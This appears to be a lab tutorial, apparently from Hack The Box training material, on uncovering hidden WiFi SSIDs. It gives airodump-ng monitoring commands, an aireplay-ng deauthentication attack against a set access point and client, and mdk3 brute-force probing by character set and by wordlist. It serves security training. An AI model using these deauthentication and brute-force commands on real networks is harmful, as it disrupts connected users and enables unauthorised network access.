In WiFi networks, the Service Set Identifier (SSID) is the name that identifies a particular wireless network. While most networks broadcast their SSIDs to make it easy for devices to connect, some networks choose to hide their SSIDs as a security measure. The idea behind hiding an SSID is to make the network less visible to casual users and potential attackers. However, this method only provides a superficial layer of security, as determined attackers can still discover hidden SSIDs using various techniques.

![](Finding%20Hidden%20SSIDs-20260916-154702.png)
#### Watching the Hidden Network

```sh
3kjS@htb[/htb]$ sudo airmon-ng start wlan0
```
#### Scanning WiFi Networks

```sh
3kjS@htb[/htb]$ sudo airodump-ng -c 1 wlan0mon
```
### Detecting Hidden SSID using Deauth

```sh
3kjS@htb[/htb]$ sudo airodump-ng -c 1 wlan0mon
```

```sh
3kjS@htb[/htb]$ sudo aireplay-ng -0 10 -a B2:C1:3D:3B:2B:A1 -c 02:00:00:00:02:00 wlan0mon
```

```sh
3kjS@htb[/htb]$ sudo airodump-ng -c 1 wlan0mon
```
### Bruteforcing Hidden SSID

```sh
mdk3 <interface> <test mode> [test_ options]
```

|**Option**|**Description**|
|---|---|
|`-e`|Specify the SSID for probing.|
|`-f`|Read lines from a file for brute-forcing hidden SSIDs.|
|`-t`|Set the MAC address of the target AP.|
|`-s`|Set the speed (Default: unlimited, in Bruteforce mode: 300).|
|`-b`|Use full brute-force mode (recommended for short SSIDs only). This switch is used to show its help screen|
#### Bruteforcing all possible values

To bruteforce with all possible values, we can use `-b` as the `test_option` in mdk3. We can set the following options for it.

- upper case (u)
- digits (n)
- all printed (a)
- lower and upper case (c)
- lower and upper case plus numbers (m)

```sh
3kjS@htb[/htb]$ sudo mdk3 wlan0mon p -b u -c 1 -t A2:FF:31:2C:B1:C4
```
#### Bruteforcing using a Wordlist

```sh
3kjS@htb[/htb]$ sudo mdk3 wlan0mon p -f /opt/wordlist.txt -t D2:A3:32:13:29:D5
```
